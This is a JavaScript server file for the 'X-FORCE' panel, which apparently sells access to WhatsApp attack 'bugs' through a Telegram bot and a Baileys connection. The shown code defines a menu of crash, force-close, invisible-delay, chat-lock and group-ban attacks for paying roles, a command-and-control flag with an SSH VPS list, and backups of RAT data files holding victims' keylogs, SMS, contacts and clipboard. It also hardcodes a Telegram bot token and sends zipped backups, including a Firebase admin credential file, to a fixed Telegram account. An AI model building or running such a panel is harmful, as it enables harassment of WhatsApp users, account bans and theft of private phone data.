const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
const fs = require("fs");
const chalk = require("chalk");
const path = require('path');
const LOG_FILE = path.join(__dirname, "logUser.txt");

function formatTimestamp() {
  const now = new Date();
  const date = now.getDate().toString().padStart(2, '0');
  const month = (now.getMonth() + 1).toString().padStart(2, '0');
  const year = now.getFullYear();
  const hours = now.getHours().toString().padStart(2, '0');
  const minutes = now.getMinutes().toString().padStart(2, '0');
  const seconds = now.getSeconds().toString().padStart(2, '0');
  return `[${date}/${month}/${year} | ${hours}:${minutes}:${seconds}]`;
}
function saveLog(message) {
  fs.appendFileSync(
    LOG_FILE,
    `${formatTimestamp()} #[ X-FORCE ] > ${message}\n`,
    "utf8"
  );
}
function logSuccess(message) {
  console.log(
    chalk.gray(formatTimestamp()),
    chalk.green("#[ X-FORCE ] >"),
    chalk.white(message)
  );

  saveLog(message);
}
function logWarning(message) {
  console.log(
    chalk.gray(formatTimestamp()),
    chalk.yellow("#[ X-FORCE ] >"),
    chalk.white(message)
  );

  saveLog(message);
}
function logError(message, error) {
  console.log(
    chalk.gray(formatTimestamp()),
    chalk.red("#[ X-FORCE ] >"),
    chalk.white(message)
  );

  saveLog(message);

  if (error) {
    console.log(chalk.red(error.stack || error));
    fs.appendFileSync(LOG_FILE, `${error.stack || error}\n`, "utf8");
  }
}

process.on('unhandledRejection', (reason, promise) => {
  logError('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
  logError('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};


const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
    generateForwardMessageContent,
} = require('@whiskeysockets/baileys');
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fsPromises = require('fs').promises;
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const multer = require('multer');
const archiver = require('archiver');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
let chatList = [];

// ═══════════════════════════════════════════════════════════════════
// [PUBLIK CHAT] Storage untuk Flutter publik_chat.dart
// ═══════════════════════════════════════════════════════════════════
let wsRoomMembers = {};  // { "GroupName": ["user1", "user2"] }
const PUBLIK_CHAT_FILE = path.join(__dirname, 'publik_chat.json');

if (!fs.existsSync(PUBLIK_CHAT_FILE)) {
  fs.writeFileSync(PUBLIK_CHAT_FILE, JSON.stringify({ global: [], groups: {} }, null, 2));
}

function loadPublikChat() {
  try {
    const raw = fs.readFileSync(PUBLIK_CHAT_FILE, 'utf8');
    const d = JSON.parse(raw || '{}');
    if (!Array.isArray(d.global)) d.global = [];
    if (typeof d.groups !== 'object' || d.groups === null) d.groups = {};
    return d;
  } catch { return { global: [], groups: {} }; }
}

function savePublikChat(data) {
  try {
    fs.writeFileSync(PUBLIK_CHAT_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    logError('[PUBLIK-CHAT] Gagal save:', e.message);
  }
}
// ─────────────────────────────────────────────────────────
// [CHAT-ENRICH] Tambahin profile/role ke setiap pesan chat
// ─────────────────────────────────────────────────────────
function enrichChatMessage(msg) {
  if (!msg || typeof msg !== 'object') return msg;
  try {
    const db = loadDatabase();
    const uname = msg.username || msg.from || msg.userId;
    const user = db.find(u => u.username === uname);

    return {
      ...msg,
      username:        msg.username || msg.from || uname || 'unknown',
      userId:          msg.userId || msg.username || msg.from || 'unknown',
      displayName:     msg.displayName || user?.displayName || uname || 'Unknown',
      role:            msg.role || user?.role || 'member',
      profileImageUrl: user?.profileImageUrl || msg.profileImageUrl || null,
      avatarUrl:       msg.avatarUrl || 'assets/images/logo.jpg',
    };
  } catch (_) {
    return msg;
  }
}

function enrichChatMessages(list) {
  if (!Array.isArray(list)) return [];
  return list.map(enrichChatMessage);
}
const DATA_FILE = './database/chat_data.json';
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const DB_DIR = path.join(__dirname, "database");
const PRAYER_DB = path.join(DB_DIR, "prayertime.json");
const PRAYER_MSG = path.join(DB_DIR, "prayermessage.json");
const blackdb = "./blacklist.json";
const admin = require("./database/firebase");
const MAINTENANCE_FILE = path.join(__dirname, 'maintenance.json');
const APP_SECURITY_FILE = path.join(__dirname, 'appSecurity.json');
const { ToolsController, sesionKey } = require("./tgtools");
const SESSION_PATH = path.join(__dirname, "X-FORCE");
const THIRTY_MINUTES = 15 * 60 * 1000;
const qrCodes = {};
const pendingCkey = {};
const pendingRoleMenu = {};
let activeKeys = {};
const biz = {};
const mess = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const wsPort = 2766;
const PORT = 2766;
const HOST = "http://console.jhonaleystore.id";
const SETORAN_FILE = path.join(__dirname, "setoran.json");
const BOT_SYSTEM_KEY = "SYSTEM_BOT_KEY_2026";
const BUKTI_DIR = path.join(__dirname, "uploads", "bukti");
const PRICE_FILE = path.join(__dirname, "setoran_prices.json");

if (!fs.existsSync(BUKTI_DIR)) fs.mkdirSync(BUKTI_DIR, { recursive: true });
if (!fs.existsSync(SETORAN_FILE)) fs.writeFileSync(SETORAN_FILE, JSON.stringify([]));
if (!fs.existsSync(PRICE_FILE)) {
  fs.writeFileSync(PRICE_FILE, JSON.stringify({
    member: 2000, vip: 2000, reseller: 2000,
    admin: 2000, partner: 2000, owner: 2000, developer: 2000,
  }, null, 2));
}
const BACKUP_DIR = path.join(__dirname, 'backups');
const BACKUP_INTERVAL_MS = 20 * 60 * 1000; // 10 menit (sebelum restart 20 menit)
const MAX_BACKUPS = 10; // Simpan 10 backup terakhir
const BACKUP_STATE_FILE = path.join(BACKUP_DIR, 'backup_state.json');
const BACKUP_TELEGRAM_ID = "8857653829";
const BACKUP_MAX_TELEGRAM_MB = 45;

// 🔒 BACKUP ACCESS CONTROL — HANYA ID/USERNAME INI YANG BISA BACKUP
const BACKUP_ALLOWED_TELEGRAM_IDS = [
  "8857653829"
];
const BACKUP_ALLOWED_USERNAMES = [
  "EL OFFICIAL"
];
// 🔒 Cek apakah Telegram user boleh backup
function isAllowedBackupTelegram(userId) {
  return BACKUP_ALLOWED_TELEGRAM_IDS.includes(String(userId));
}

// 🔒 Cek apakah username server boleh backup
function isAllowedBackupUsername(username) {
  return BACKUP_ALLOWED_USERNAMES.includes(username);
}

// File & folder yang akan di-backup
const BACKUP_ITEMS = [
  // Database utama
  'database.json',
  'keyList.json',
  'blacklist.json',
  'setoran.json',
  'setoran_prices.json',
  'benefits.json',
  'chat_rooms.json',
  'chat_messages.json',
  'stories.json',
  'story_comments.json',
  'telegram.json',
  'maintenance.json',
  'appSecurity.json',
  'restart_state.json',
  'jasapost.json',
  'index.js',
  'package.json',
  'jasapost_kode.json',
  'rat_targets.json',
  'rat_commands.json',
  'rat_responses.json',
  'rat_notifs.json',
  'rat_keylogs.json',
  'rat_clipboard.json',
  'rat_apps.json',
  'rat_contacts.json',
  'rat_sms.json',
  'doaharian.json',
  'vps.json',
  'logUser.txt',
  'chat.json',
  'firebase-adminsdk.json.json', // ← Tambahan dari gambar
  'tgtools.js',                  // ← Tambahan dari gambar
  'shop_orders.json',              // ← TAMBAH
  'shop_telegram_links.json',      // ← TAMBAH
];


// Folder yang akan di-backup (recursive)
const BACKUP_FOLDERS = [
  'assets',      // ← Tambahan dari gambar
  'database',
  'user_logs',
  'X-FORCE',
  'vip',         // ← Di-uncomment sesuai gambar
  'story_media', // ← Tambahan dari gambar
  'uploads',     // ← Tambahan dari gambar
];
// ═══════════════════════════════════════════════════════════
// [+] AUTO BACKUP FUNCTIONS
// ═══════════════════════════════════════════════════════════

// Pastikan folder backup ada
function initBackupDir() {
  if (!fs.existsSync(BACKUP_DIR)) {
    fs.mkdirSync(BACKUP_DIR, { recursive: true });
    logSuccess('[BACKUP] Folder backups/ dibuat.');
  }
}

// Format tanggal untuk nama folder backup
function getBackupTimestamp() {
  const now = new Date();
  const pad = (n) => n.toString().padStart(2, '0');
  return `${now.getFullYear()}${pad(now.getMonth() + 1)}${pad(now.getDate())}_${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}`;
}

// Copy folder recursively
function copyFolderRecursive(src, dest) {
  try {
    if (!fs.existsSync(src)) return 0;
    if (!fs.existsSync(dest)) fs.mkdirSync(dest, { recursive: true });

    let count = 0;
    const entries = fs.readdirSync(src, { withFileTypes: true });

    for (const entry of entries) {
      const srcPath = path.join(src, entry.name);
      const destPath = path.join(dest, entry.name);

      if (entry.isDirectory()) {
        count += copyFolderRecursive(srcPath, destPath);
      } else {
        try {
          fs.copyFileSync(srcPath, destPath);
          count++;
        } catch (e) {
          logWarning(`[BACKUP] Skip file ${entry.name}: ${e.message}`);
        }
      }
    }
    return count;
  } catch (e) {
    logError(`[BACKUP] Error copy folder ${src}: ${e.message}`);
    return 0;
  }
}

// Baca state backup
function readBackupState() {
  try {
    if (!fs.existsSync(BACKUP_STATE_FILE)) {
      return { lastBackup: 0, backupCount: 0, history: [] };
    }
    return JSON.parse(fs.readFileSync(BACKUP_STATE_FILE, 'utf8'));
  } catch {
    return { lastBackup: 0, backupCount: 0, history: [] };
  }
}

// Simpan state backup
function saveBackupState(data) {
  try {
    initBackupDir();
    fs.writeFileSync(BACKUP_STATE_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    logError('[BACKUP] Gagal save state:', e.message);
  }
}

// Hapus backup lama (simpan MAX_BACKUPS terakhir)
function rotateOldBackups() {
  try {
    const folders = fs.readdirSync(BACKUP_DIR)
      .filter(f => f.startsWith('backup_') && fs.statSync(path.join(BACKUP_DIR, f)).isDirectory())
      .sort()
      .reverse();

    if (folders.length > MAX_BACKUPS) {
      const toDelete = folders.slice(MAX_BACKUPS);
      for (const folder of toDelete) {
        const folderPath = path.join(BACKUP_DIR, folder);
        fs.rmSync(folderPath, { recursive: true, force: true });
        logWarning(`[BACKUP] Hapus backup lama: ${folder}`);
      }
    }
  } catch (e) {
    logError('[BACKUP] Rotate error:', e.message);
  }
}

// Fungsi utama backup
async function performBackup(reason = "Auto Backup Terjadwal") {
  const startTime = Date.now();
  logSuccess(`[BACKUP] Memulai backup. Alasan: ${reason}`);

  try {
    initBackupDir();

    const timestamp = getBackupTimestamp();
    const backupFolderName = `backup_${timestamp}`;
    const backupFolderPath = path.join(BACKUP_DIR, backupFolderName);

    if (!fs.existsSync(backupFolderPath)) {
      fs.mkdirSync(backupFolderPath, { recursive: true });
    }

    let fileCount = 0;
    let fileList = [];
    let totalSize = 0;

    // ─── Backup file individual ────────────────────────────
    for (const item of BACKUP_ITEMS) {
      const srcPath = path.join(__dirname, item);
      if (fs.existsSync(srcPath)) {
        try {
          const destPath = path.join(backupFolderPath, item);
          fs.copyFileSync(srcPath, destPath);
          const size = fs.statSync(srcPath).size;
          fileCount++;
          totalSize += size;
          fileList.push({ name: item, size });
        } catch (e) {
          logWarning(`[BACKUP] Gagal backup ${item}: ${e.message}`);
        }
      }
    }

    // ─── Backup folder recursive ───────────────────────────
    for (const folder of BACKUP_FOLDERS) {
      const srcPath = path.join(__dirname, folder);
      if (fs.existsSync(srcPath)) {
        const destPath = path.join(backupFolderPath, folder);
        const count = copyFolderRecursive(srcPath, destPath);
        fileCount += count;
        logSuccess(`[BACKUP] Folder '${folder}': ${count} file`);
      }
    }

    // ─── Hitung total size ─────────────────────────────────
    const getFolderSize = (dirPath) => {
      let size = 0;
      try {
        const entries = fs.readdirSync(dirPath, { withFileTypes: true });
        for (const entry of entries) {
          const fullPath = path.join(dirPath, entry.name);
          if (entry.isDirectory()) size += getFolderSize(fullPath);
          else size += fs.statSync(fullPath).size;
        }
      } catch {}
      return size;
    };
    totalSize = getFolderSize(backupFolderPath);

    // ─── Buat metadata ─────────────────────────────────────
    const metadata = {
      folderName: backupFolderName,
      createdAt: new Date().toISOString(),
      reason,
      fileCount,
      totalSize,
      totalSizeMB: (totalSize / 1024 / 1024).toFixed(2),
      durationMs: Date.now() - startTime,
      files: fileList,
    };

    fs.writeFileSync(
      path.join(backupFolderPath, '_metadata.json'),
      JSON.stringify(metadata, null, 2)
    );

    // ─── Update state ──────────────────────────────────────
    const state = readBackupState();
    state.lastBackup = Date.now();
    state.backupCount = (state.backupCount || 0) + 1;
    if (!state.history) state.history = [];
    state.history.unshift({
      folderName: backupFolderName,
      createdAt: metadata.createdAt,
      reason,
      fileCount,
      totalSizeMB: metadata.totalSizeMB,
    });
    state.history = state.history.slice(0, 20);
    saveBackupState(state);

    // ─── Rotate old backups ────────────────────────────────
    rotateOldBackups();

    const duration = ((Date.now() - startTime) / 1000).toFixed(2);
logSuccess(`[BACKUP] ✅ Selesai! ${fileCount} file, ${metadata.totalSizeMB} MB, ${duration}s`);

// 🔥 Kirim ke Telegram (background)
setImmediate(() => {
  sendBackupToTelegram(backupFolderName, backupFolderPath, metadata)
    .catch(e => logError(`[BACKUP-TG] ${e.message}`));
});

return metadata;

  } catch (err) {
    logError(`[BACKUP] ❌ Gagal: ${err.message}`);
    return null;
  }
}

// Start auto backup timer
let backupTimer = null;
let backupFirstTimeout = null;  // ← tambah ini

function startAutoBackupTimer() {
  if (backupTimer) clearInterval(backupTimer);
  if (backupFirstTimeout) clearTimeout(backupFirstTimeout);  // ← tambah ini

  const state = readBackupState();
  const elapsed = Date.now() - (state.lastBackup || 0);
  const remaining = BACKUP_INTERVAL_MS - elapsed;

  if (remaining <= 0) {
    logWarning("[BACKUP] Interval sudah lewat, backup sekarang...");
    backupFirstTimeout = setTimeout(() => performBackup("Interval auto-backup terlewat"), 15000);
  } else {
    logSuccess(`[BACKUP] Auto-backup dalam ${formatUptime(remaining)} lagi.`);
    backupFirstTimeout = setTimeout(() => performBackup("Auto Backup Terjadwal"), remaining);
  }

  backupTimer = setInterval(() => {
    performBackup("Auto Backup Terjadwal");
  }, BACKUP_INTERVAL_MS);
}
// ═══════════════════════════════════════════════════════════
// [+] FUNGSI ZIP BACKUP FOLDER
// ═══════════════════════════════════════════════════════════
function zipBackupFolder(folderPath, outputZipPath) {
  return new Promise((resolve, reject) => {
    try {
      const output = fs.createWriteStream(outputZipPath);
      const archive = archiver('zip', { zlib: { level: 9 } });

      output.on('close', () => resolve(outputZipPath));
      archive.on('error', (err) => reject(err));

      archive.pipe(output);
      archive.directory(folderPath, false);
      archive.finalize();
    } catch (e) {
      reject(e);
    }
  });
}

// ═══════════════════════════════════════════════════════════
// [+] FUNGSI KIRIM BACKUP KE TELEGRAM
// ═══════════════════════════════════════════════════════════
async function sendBackupToTelegram(backupFolderName, backupFolderPath, metadata) {
  const targetId = BACKUP_TELEGRAM_ID;
  const totalMB = parseFloat(metadata.totalSizeMB);

  try {
    // ─── Cek ukuran file ──────────────────────────────
    if (totalMB > BACKUP_MAX_TELEGRAM_MB) {
      logWarning(`[BACKUP-TG] Skip kirim (${totalMB}MB > ${BACKUP_MAX_TELEGRAM_MB}MB)`);

      await bot.sendMessage(targetId,
        `⚠️ *BACKUP TERLALU BESAR*\n\n` +
        `📁 \`${backupFolderName}\`\n` +
        `💾 ${totalMB} MB (limit: ${BACKUP_MAX_TELEGRAM_MB} MB)\n` +
        `📄 ${metadata.fileCount} file\n` +
        `📝 ${metadata.reason}\n\n` +
        `_File backup tetap tersimpan di server._`,
        { parse_mode: "Markdown" }
      ).catch(() => {});
      return false;
    }

    // ─── Zip folder backup ────────────────────────────
    const zipName = `${backupFolderName}.zip`;
    const zipPath = path.join(BACKUP_DIR, zipName);

    logSuccess(`[BACKUP-TG] Membuat zip: ${zipName}...`);
    await zipBackupFolder(backupFolderPath, zipPath);

    const zipSizeMB = (fs.statSync(zipPath).size / 1024 / 1024).toFixed(2);
    logSuccess(`[BACKUP-TG] Zip selesai: ${zipSizeMB} MB`);

    // ─── Kirim ke Telegram ────────────────────────────
    await bot.sendDocument(targetId, zipPath, {
      caption:
        `💾 *AUTO BACKUP X-FORCE*\n\n` +
        `📁 \`${backupFolderName}\`\n` +
        `📄 ${metadata.fileCount} file\n` +
        `💾 ${metadata.totalSizeMB} MB (zip: ${zipSizeMB} MB)\n` +
        `⏱️ ${(metadata.durationMs / 1000).toFixed(1)}s\n` +
        `📝 ${metadata.reason}\n` +
        `🕐 ${new Date(metadata.createdAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}`,
      parse_mode: "Markdown"
    });

    logSuccess(`[BACKUP-TG] ✅ Terkirim ke Telegram ID ${targetId}`);

    // ─── Hapus zip setelah kirim (hemat disk) ─────────
    try { fs.unlinkSync(zipPath); } catch {}

    return true;

  } catch (e) {
    logError(`[BACKUP-TG] Gagal kirim: ${e.message}`);

    // Notif gagal ke target
    await bot.sendMessage(targetId,
      `❌ *BACKUP GAGAL DIKIRIM*\n\n` +
      `📁 \`${backupFolderName}\`\n` +
      `📛 Error: \`${e.message.substring(0, 150)}\``,
      { parse_mode: "Markdown" }
    ).catch(() => {});

    return false;
  }
}

const BENEFIT_FILE = path.join(__dirname, "benefits.json");
if (!fs.existsSync(BENEFIT_FILE)) fs.writeFileSync(BENEFIT_FILE, JSON.stringify([]));
const CHAT_ROOMS_FILE = path.join(__dirname, "chat_rooms.json");
const CHAT_MESSAGES_FILE = path.join(__dirname, "chat_messages.json");
const CHAT_MEDIA_DIR = path.join(__dirname, "uploads", "chat_media");

if (!fs.existsSync(CHAT_ROOMS_FILE)) fs.writeFileSync(CHAT_ROOMS_FILE, JSON.stringify([]));
if (!fs.existsSync(CHAT_MESSAGES_FILE)) fs.writeFileSync(CHAT_MESSAGES_FILE, JSON.stringify([]));
if (!fs.existsSync(CHAT_MEDIA_DIR)) fs.mkdirSync(CHAT_MEDIA_DIR, { recursive: true });
const RESTART_STATE_FILE = path.join(__dirname, 'restart_state.json');
const RESTART_INTERVAL_MS = 20 * 60 * 1000; // 20 menit (bisa diubah)
const SERVER_START_TIME = Date.now();

// ✅ PINDAH KE SINI
let isRestarting = false;
let restartTimer = null;

// Baca state restart
function readRestartState() {
  try {
    if (!fs.existsSync(RESTART_STATE_FILE)) {
      return { lastRestart: 0, restartCount: 0, firstBoot: true };
    }
    return JSON.parse(fs.readFileSync(RESTART_STATE_FILE, 'utf8'));
  } catch {
    return { lastRestart: 0, restartCount: 0, firstBoot: true };
  }
}

function saveRestartState(data) {
  try {
    fs.writeFileSync(RESTART_STATE_FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    logError('[RESTART] Gagal save state:', e.message);
  }
}

// Format uptime
function formatUptime(ms) {
  const s = Math.floor(ms / 1000);
  const d = Math.floor(s / 86400);
  const h = Math.floor((s % 86400) / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  let out = [];
  if (d > 0) out.push(`${d}h`);
  if (h > 0) out.push(`${h}j`);
  if (m > 0) out.push(`${m}m`);
  out.push(`${sec}d`);
  return out.join(' ');
}

// Kirim notif ke group (dengan guard & timeout)
async function notifyGroup(message, parseMode = "Markdown", richOptions = {}) {
  try {
    if (!bot || typeof bot.sendMessage !== 'function') {
      logWarning("[NOTIF] Bot belum siap, notif ditunda.");
      await new Promise(r => setTimeout(r, 3000));
      if (!bot || typeof bot.sendMessage !== 'function') {
        logError("[NOTIF] Bot masih belum siap, skip notif.");
        return;
      }
    }

    const finalMessage = Object.keys(richOptions).length > 0
      ? buildRichCaption(message, { ...richOptions, parseMode })
      : message;

    await Promise.race([
      bot.sendMessage(ID_GROUP, finalMessage, { parse_mode: parseMode }),
      new Promise((_, reject) => 
        setTimeout(() => reject(new Error("Notif timeout")), 10000)
      )
    ]);
    
    logSuccess(`[NOTIF] Terkirim ke group`);
  } catch (e) {
    logError(`[NOTIF ERROR] ${e.message}`);
  }
}
// Story & Comment auto-init
const STORY_FILE = path.join(__dirname, 'stories.json');
const STORY_COMMENT_FILE = path.join(__dirname, 'story_comments.json');
const STORY_MEDIA_DIR = path.join(__dirname, 'story_media');

if (!fs.existsSync(STORY_FILE)) fs.writeFileSync(STORY_FILE, JSON.stringify([]));
if (!fs.existsSync(STORY_COMMENT_FILE)) fs.writeFileSync(STORY_COMMENT_FILE, JSON.stringify([]));
if (!fs.existsSync(STORY_MEDIA_DIR)) fs.mkdirSync(STORY_MEDIA_DIR, { recursive: true });
const TOKEN = "9123685931:AAGzqOccgeX2OvGAUZSnrKmOdh2wMu4_K58";
const UNLIMITED_ROLES = ['reseller', 'owner', 'developer', 'partner', 'moderator', 'founder'];
const ALLOWED_CUSTOM_ROLES = ['member', 'vip', 'reseller', 'partner', 'owner', 'developer'];
const ADMIN_ROLES = ['owner', 'developer'];
const ALLOWED_ROLES = ['reseller', 'vip', 'partner', 'owner', 'developer'];
const JASAPOST_FILE = path.join(__dirname, 'jasapost.json');
const JASAPOST_KODE_FILE = path.join(__dirname, 'jasapost_kode.json');
app.use(express.json()); // buat nerima application/json
app.use(express.urlencoded({ extended: true })); // buat nerima form-data
// ═══════════════════════════════════════════════════════════
// [+] PUBLIC HEALTH ENDPOINTS — untuk debug koneksi app
// ═══════════════════════════════════════════════════════════

// 1. Health check ringan (tanpa key)
app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    online: true,
    uptime: Math.floor(process.uptime()),
    timestamp: Date.now(),
    node: process.version,
    platform: process.platform,
    domain: HOST,
    port: PORT,
  });
});

// 2. Info versi server (tanpa key)
app.get("/api/version", (req, res) => {
  res.json({
    valid: true,
    server: "   Project API",
    version: "10.0.0",
    node: process.version,
    uptime: Math.floor(process.uptime()),
    timestamp: Date.now(),
  });
});

// 3. Test koneksi dari app (tanpa key)
app.get("/api/check-connection", (req, res) => {
  res.json({
    connected: true,
    server: "X-FORCE",
    time: new Date().toISOString(),
    clientIp:
      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.ip,
  });
});

// 4. Handle preflight OPTIONS untuk endpoint publik
app.options("/health", (req, res) => res.sendStatus(204));
app.options("/api/version", (req, res) => res.sendStatus(204));
app.options("/api/check-connection", (req, res) => res.sendStatus(204));
const news = [
        {
    image: "https://files.catbox.moe/jlz2cr.jpg",
    title: "X-FORCE Project",
    desc: "Next-generation cyberpunk marketplace featuring advanced security simulation tools, futuristic RAT interface concepts, encrypted systems, and premium access panels inside the X-FORCE universe."
        }
    ];
const jjVideos = [
    { video: "https://d.uguu.se/BYqJdzRU.mp4" }
];
const thanksTo = [
    { username: "#EL OFFICIAL", role: "Pemilik", link: "https://t.me/ELOFFICIALLL" },  
];
const ROLE_MAP = {
    user: "userList",
    reseller: "resellerUser",
    partner: "partnerUser",
    owner: "ownerUser",
    developer: "developerUser"
};
// ─── Bug yang diizinkan untuk SENDER GLOBAL (HANYA 3 BUG) ───
const GLOBAL_ALLOWED_BUGS = [
  "LockchatAh",
  "lockchatV2",
  "X-FORCEfcnic",
  "fcX-FORCEfc",
  "delayhardinvis",
  "Delayultimate",
  "X-FORCEFreeze",
  "DelayX-FORCE",
  "EL OFFICIAL",
  "crashuinewfunc",
  "Lockchatv3",
  "crashblanktowb",
  "crashdelay",
  "delayhardinvisxfrcsx",
  "crashuitwo",
  "delayhardxfrc",
  "gcban",
  "fcgroupnewxlock",
  "newBandGbPler"
];

// Cooldown khusus global (detik)
const GLOBAL_COOLDOWN_SECONDS = 120;
const bugs = [
    { bug_id: "LockchatAh", bug_name: "LOCK CHAT V1" },
    { bug_id: "lockchatV2", bug_name: "LOCK CHAT V2" },
    { bug_id: "Lockchatv3", bug_name: "LOCK CHAT V3" },
    { bug_id: "crashuinewfunc", bug_name: "CRASH UI X LOCK CHAT" },
    { bug_id: "Delayultimate", bug_name: "DELAY AMAN UNTUK NOKOS" },
    { bug_id: "delayhardxfrc", bug_name: "DELAY HARD NEW" },
    { bug_id: "EL OFFICIAL", bug_name: "FREZEE CHAT X DELAY NEW" },
    { bug_id: "X-FORCEfcnic", bug_name: "FORCE CLOSE X DELAY" },
    { bug_id: "crashblanktowb", bug_name: "BLANK X DELAY NEW FUNCTION" },
    { bug_id: "fcX-FORCEfc", bug_name: "FORCE CLOSE NEW" },
    { bug_id: "delayhardinvisxfrcsx", bug_name: "DELAY HARD INVIS" },
    { bug_id: "delayhardinvis", bug_name: "DELAY HARD INVISIBLE" },
    { bug_id: "DelayX-FORCE", bug_name: "DELAY HARD X FRZEE" },
    { bug_id: "X-FORCEFreeze", bug_name: "BLANK X FREEZE COMBO DELAY" },
    { bug_id: "crashdelay", bug_name: "CRASH X DELAY HARD X FRZEE" },
    { bug_id: "crashuitwo", bug_name: "COMBO CRASH UI" }
];
const buggc = [
  { bug_id: "gcban", bug_name: "BAN GB TRY" },
  { bug_id: "newBandGbPler", bug_name: "BAN GB NEW" },
  { bug_id: "fcgroupnewxlock", bug_name: "FC GROUPS" },
  
//  { bug_id: "delay", bug_name: "[FORCLOSE ANDRO]"},
 // { bug_id: "iosXv", bug_name: "[CRASH IOS]"},
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  logSuccess("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

function readAppSecurity() {
    if (!fs.existsSync(APP_SECURITY_FILE)) {
        fs.writeFileSync(APP_SECURITY_FILE, JSON.stringify({
            appVersion: "10.0.0",
            appCertificate: "" // Kosong dulu, nanti diisi lewat /updateSHA
        }, null, 2));
    }
    return JSON.parse(fs.readFileSync(APP_SECURITY_FILE, 'utf8'));
}

function saveAppSecurity(data) {
    fs.writeFileSync(APP_SECURITY_FILE, JSON.stringify(data, null, 2));
}

function readMaintenance() {
    if (!fs.existsSync(MAINTENANCE_FILE)) {
        fs.writeFileSync(MAINTENANCE_FILE, JSON.stringify({ active: false, reason: "" }, null, 2));
    }
    return JSON.parse(fs.readFileSync(MAINTENANCE_FILE, 'utf8'));
}

function saveMaintenance(data) {
    fs.writeFileSync(MAINTENANCE_FILE, JSON.stringify(data, null, 2));
}
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

function getBlacklist() {
  if (!fs.existsSync(blackdb)) fs.writeFileSync(blackdb, "[]");
  return JSON.parse(fs.readFileSync(blackdb));
}

function saveBlacklist(data) {
  fs.writeFileSync(blackdb, JSON.stringify(data, null, 2));
}

function getBlacklist() {
    if (!fs.existsSync("./blacklist.json")) {
        fs.writeFileSync("./blacklist.json", "[]");
    }
    return JSON.parse(fs.readFileSync("./blacklist.json"));
}


// ─── ROLE ACCESS LIST ────────────────────────────────────────────────────────
// Helper baca/tulis JSON
function readJasapost(filePath, defaultVal) {
    try {
        if (!fs.existsSync(filePath)) return defaultVal;
        return JSON.parse(fs.readFileSync(filePath, 'utf8'));
    } catch (e) {
        return defaultVal;
    }
}

function writeJasapost(filePath, data) {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
}

// Middleware Cek Role
function checkRole(req, res, next) {
    const { key } = req.query;
    const keyInfo = activeKeys[key];

    if (!keyInfo) {
        return res.status(401).json({
            valid: false,
            message: "Invalid session key"
        });
    }

    const db = loadDatabase();
    const user = db.find(u => u.username === keyInfo.username);

